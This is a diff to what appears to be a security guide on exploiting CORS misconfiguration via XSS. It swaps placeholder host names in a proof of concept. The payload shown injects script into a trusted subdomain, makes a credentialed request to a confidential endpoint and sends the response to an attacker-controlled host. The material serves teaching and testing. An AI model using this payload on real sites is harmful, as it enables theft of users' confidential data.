@@ -137,11 +137,11 @@ https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
 #### Proof of Concept
-This POC requires that the respective JS script is hosted at `evil.com`
+This POC requires that the respective JS script is hosted at `attacker-controlled.com`
 
 ```js
 <script>
-document.location = "https://trusted-subdomain.website_with_xss.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://website_with_xss.com/endpoint_with_confidential_data',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker_exploit_server.com?key='%2bthis.responseText; };%3C/script>";
+document.location = "https://trusted-subdomain.website-with-xss.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://website_with_xss.com/endpoint_with_confidential_data',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker-controller.com?key='%2bthis.responseText; };%3C/script>";
 </script>
 ```
 
